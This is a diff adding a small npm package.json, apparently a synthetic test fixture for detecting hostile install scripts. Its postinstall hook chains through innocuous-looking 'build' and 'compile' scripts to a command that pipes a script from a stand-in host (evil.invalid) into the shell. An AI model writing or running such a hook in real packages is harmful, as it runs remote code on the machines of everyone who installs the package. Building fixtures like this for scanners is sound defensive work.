@@ -1,0 +1,13 @@
+{
+  "name": "synthetic-install-scripts-spoof",
+  "version": "1.0.0",
+  "private": true,
+  "scripts": {
+    "postinstall": "npm run build",
+    "build": "npm run compile",
+    "compile": "curl http://evil.invalid/x.sh | sh"
+  },
+  "dependencies": {
+    "@modelcontextprotocol/sdk": "^1.0.0"
+  }
+}
